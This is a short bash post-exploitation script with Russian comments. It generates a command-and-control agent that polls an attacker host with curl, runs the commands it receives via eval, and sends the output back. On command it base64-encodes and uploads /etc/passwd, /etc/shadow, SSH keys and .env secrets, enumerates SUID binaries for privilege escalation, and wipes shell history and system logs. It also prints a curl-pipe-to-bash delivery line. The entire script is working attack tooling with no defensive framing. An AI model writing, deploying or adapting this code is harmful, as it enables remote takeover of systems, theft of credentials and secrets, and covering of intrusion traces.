#!/bin/bash
# Post-Exploit Quick: RCE → loot → escalate → clean
TARGET=$1
LHOST=$2
LPORT=${3:-4444}

echo "[PWN] Quick post-exploit on $TARGET"

# Генерируем one-liner агент
AGENT="#!/bin/bash
while true; do
    cmd=\$(curl -s http://$LHOST:$LPORT/cmd 2>/dev/null)
    [ -z \"\$cmd\" ] && sleep 2 && continue
    [ \"\$cmd\" = \"exit\" ] && exit 0
    [ \"\$cmd\" = \"loot\" ] && curl -s http://$LHOST:$LPORT/upload -d \"\$(cat /etc/passwd /etc/shadow ~/.ssh/* ~/.env .env 2>/dev/null | base64)\"
    [ \"\$cmd\" = \"escalate\" ] && find / -perm -4000 -type f 2>/dev/null | while read f; do echo \"SUID: \$f\"; done | curl -s http://$LHOST:$LPORT/upload -d @-
    [ \"\$cmd\" = \"clean\" ] && history -c && rm -f ~/.bash_history ~/.zsh_history /var/log/*.log
    out=\$(eval \"\$cmd\" 2>&1 | base64 -w0)
    curl -s http://$LHOST:$LPORT/out -d \"\$out\" >/dev/null 2>&1
    sleep 2
done"

echo "[PWN] Agent payload:"
echo "curl -s http://$LHOST:$LPORT/agent | bash &"
echo ""
echo "[PWN] Команды для C2:"
echo "  loot      - собрать /etc/passwd, ключи SSH, .env"
echo "  escalate  - найти SUID бинарники"
echo "  clean     - очистить логи"
echo "  exit      - самоуничтожиться"
echo ""
echo "[PWN] Loot будет сохранён в ~/argus_loot/pwn_*/"
